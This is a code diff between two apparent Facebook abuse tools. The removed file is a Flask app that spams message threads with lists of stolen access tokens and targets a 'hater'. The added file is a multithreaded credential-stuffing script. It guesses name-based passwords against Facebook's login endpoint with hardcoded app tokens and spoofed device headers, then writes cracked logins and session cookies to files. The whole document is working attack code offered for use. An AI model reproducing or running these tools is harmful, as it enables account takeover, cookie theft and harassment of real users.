@@ -1,214 +1,153 @@
-from flask import Flask, request, render_template_string
-import requests
-from threading import Thread, Event
-import time
-import random
-import string
-
-app = Flask(__name__)
-app.debug = True
-
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-stop_events = {}
-threads = {}
-
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
-
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
-
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        def send_messages():
-         password = request.form.get('password')
-         password = file.read().strip()
-
-         mmm = requests.get('https://pastebin.com/raw/tn5e8Ub9').text.strip()
-
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, password, task_id))
-        threads[task_id] = thread
-        thread.start()
-
-        return f'Task started with ID: {task_id}'
-
-    return render_template_string('''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>0FFLINE T00L MULTI AND SINGLE IDS</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-image: url('https://i.ibb.co/gTd0wff/cd5b82c7013a2a0c556322bcb75732d4.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-    }
-    .container {
-      max-width: 350px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
-    }
-    .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: white;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mt-3">BL9CK P9NTH3R RUL3XX</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">Select Token Option</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
-      </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">Enter Single Token</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
-      </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">Choose Token File</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">Enter Inbox/convo id</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">Enter Your Hater Name</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">Enter Time (seconds)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">Choose Your Np File</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <div class="mb-3">
-        <label for="mmm" class="form-label">Enter your key</label>
-        <input type="text" class="form-control" id="mmm" name="mmm" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Run</button>
-    </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>Created by Sahil Ansari 3:</p>
-    <p><a href="https://www.facebook.com/S9HIL2.0?mibextid=ZbWKwL">Chat on Messenger</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+919354720853" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
-      </a>
-    </div>
-  </footer>
-  <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
-    }
-  </script>
-</body>
-</html>
-''')
-
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
+#__________________[ IMPORT ]__________________#
+import os,uuid,random,httpx,json,sys
+from time import sleep as slp
+from concurrent.futures import ThreadPoolExecutor as ted
+#__________________[ LOOP ]__________________#
+loop=0;oks=[];cps=[];pcp=[];id=[];ugen=[];ugen2=[];tokenku=[]
+#__________________[ SYS ]__________________#
+sys.stdout.write('\x1b]2; SWAG-143\x07')
+#__________________[ COLOUR ]__________________#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
+#__________________[ LINEX ]__________________#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{A}──────────────────────────────────────────────────')
+#__________________[ LOGO ]__________________#
+logo =f"""{A}
+{G}d8888b.  .d8b.  db       .d88b.   .o88b. db   db      
+{G}88  `8D d8' `8b 88      .8P  Y8. d8P  Y8 88   88      
+{G}88oooY' 88ooo88 88      88    88 8P      88ooo88      
+{R}88~~~b. 88~~~88 88      88    88 8b      88~~~88      
+{G}88   8D 88   88 88booo. `8b  d8' Y8b  d8 88   88      
+{R}Y8888P' YP   YP Y88888P  `Y88P'   `Y88P' YP   YP
+{A}──────────────────────────────────────────────────
+{R}❲{A}={R}❳{G} OWNER    {R}:{G} ZAMAN BALOCH 
+{R}❲{A}={R}❳{G} FACEBOOK {R}:{G} ZAMAN BALOCH 
+{R}❲{A}={R}❳{G} TOOL     {R}:{G} FILE CLONING
+{R}❲{A}={R}❳{G} STATUS   {R}:{G} PAID
+{A}──────────────────────────────────────────────────"""
+#__________________[ MENU ]__________________#
+def menu():
+    clear()
+    print(f'{R}❲{A}1{R}❳{G} FILE CLONING ')
+    print(f'{R}❲{A}2{R}❳{G} CONTACT TOOL OWNER') 
+    print(f'{R}❲{A}0{R}❳{G} EXIT  ');linex()
+    option=input(f'{R}❲{A}?{R}❳{G} CHOICE {R}:{G} ')
+    if option in ['1','A']:
+        filex()
+    elif option in ['2','B']:
+    	os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
     else:
-        return f'No task found with ID {task_id}.'
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+        exit(f'{R}❲{A}={R}❳{G} BYE BYE ')
+#__________________[ FILE ]__________________#
+def filex():
+    clear()
+    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} /sdcard/ZAMAN.txt');linex()
+    filex=input(f'{R}❲{A}?{R}❳{G} FILE NAME {R}:{G} ')
+    try:
+        fo=open(filex,'r').read().splitlines()
+    except FileNotFoundError:
+        print(f'{R}❲{A}={R}❳{G} FILE NOT FOUND ');slp(2)
+        filex()
+    clear()
+    print(f'{R}❲{A}1{R}❳{G} METHOD {R}❲{A}M1{R}❳{A} \n{R}❲{A}2{R}❳{G} METHOD {R}❲{A}M2{R}❳{A}  ');linex()
+    mthd=input(f'{R}❲{A}?{R}❳{G} CHOICE {R}:{G} ')
+    clear()
+    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} PK/10-15 & OTHERS/5-10');linex()
+    try:
+        pas_limit=int(input(f'{R}❲{A}={R}❳{G} PASSWORD LIMIT {R}:{G} '))
+    except:
+        pas_limit=1
+    clear()
+    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} first123/firstlast/first@@@');linex()
+    pas_list=[]
+    for i in range(pas_limit):
+        pasx=input(f'{R}❲{A}={R}❳{G} PASSWORD NO {R}❲{A}{i+1}{R}❳{G} {R}:{G} ')
+        pas_list.append(pasx)
+    with ted(max_workers=30) as swag:
+        tl=str(len(fo))
+        clear()
+        print(f'{R}❲{A}={R}❳{G} TOTAL FILE ACCOUNTS {R}:{A} '+tl)
+        print(f'{R}❲{A}={R}❳{G} TURN {R}❲{A}ON{G}/{A}OFF{R}❳{G} AIRPLANE MODE EVERY {A}3{G} MIN');linex()
+        for user in fo:
+            ids,names=user.split('|')
+            passlist=pas_list
+            if mthd in ['1','01']:
+            	swag.submit(swag1,ids,names,passlist)
+            elif mthd in ['2','02']:
+            	swag.submit(swag2,ids,names,passlist)
+    print('\033[1;37m')
+    print(f'\r{A}──────────────────────────────────────────────────')
+    print(f'{R}❲{A}={R}❳{G} THE PROCESS HAS BEEN COMPLETE...')
+    print(f'{R}❲{A}={R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
+    print(f'{R}❲{A}={R}❳{G} TOTAL CP ID {R}:{M} '+str(len(cps)))
+    print(f'\r{A}──────────────────────────────────────────────────')
+    input(f'{R}❲{A}={R}❳{G} PRESS ENTER TO BACK ')
+    main()
+#__________________[ FILE METHOD M1 ]__________________#
+def swag1(ids,names,passlist):
+    global oks,cps,loop
+    try:
+        fn=names.split(' ')[0]
+        try:
+            ln=names.split(' ')[1]
+        except:
+            ln=fn
+        for pw in passlist:
+            sys.stdout.write(f'\r\r{R}❲{G}ZAMAN-M1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}:{G}%s{R}❳{A}-{R}❲{G}CP{R}:{G}%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
+            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'User-Agent': '[FBAN/FB4A;FBAV/482.0.0.0.81;FBBV/455409026;FBDM/{density=3.0,width=1080,height=1422};FBLC/en_GB;FBRV/455409026;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/SM-A736B;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url='https://graph.facebook.com/auth/login'
+            req=httpx.post(url,data=data,headers=head).json()
+            if 'session_key' in req:
+                print(f'\r\r{G}❲ZAMAN-OK❳ '+ids+'|'+pas)
+                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
+                print(f"\r\r{Y}❲COOKIE❳➤ "+cookie)
+                open('/sdcard/ZAMAN-FILE-M1-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in req['error']['message']:
+                print(f'\r\r{M}❲ZAMAN-CP❳ '+ids+'|'+pas)
+                open('/sdcard/ZAMAN-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#__________________[ FILE METHOD M2 ]__________________#
+def swag2(ids,names,passlist):
+    global oks,cps,loop
+    try:
+        fn=names.split(' ')[0]
+        try:
+            ln=names.split(' ')[1]
+        except:
+            ln=fn
+        for pw in passlist:
+            sys.stdout.write(f'\r\r{R}❲{G}ZAMAN-M2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}:{G}%s{R}❳{A}-{R}❲{G}CP{R}:{G}%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
+            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'User-Agent': '[FBAN/FB4A;FBAV/482.0.0.0.81;FBBV/455409026;[FBAN/FB4A;FBAV/483.0.0.0.37;FBBV/455604670;FBDM/{density=4.0,width=1200,height=3146};FBLC/en_US;FBRV/455603460;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url='https://graph.facebook.com/auth/login'
+            req=httpx.post(url,data=data,headers=head).json()
+            if 'session_key' in req:
+                print(f'\r\r{G}❲ZAMAN-OK❳ '+ids+'|'+pas)
+                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
+                print(f"\r\r{Y}❲COOKIE❳➤ "+cookie)
+                open('/sdcard/ZAMAN-FILE-M2-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in req['error']['message']:
+                print(f'\r\r{M}❲ZAMAN-CP❳ '+ids+'|'+pas)
+                open('/sdcard/ZAMAN-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#__________________[ END ]__________________#
+menu()
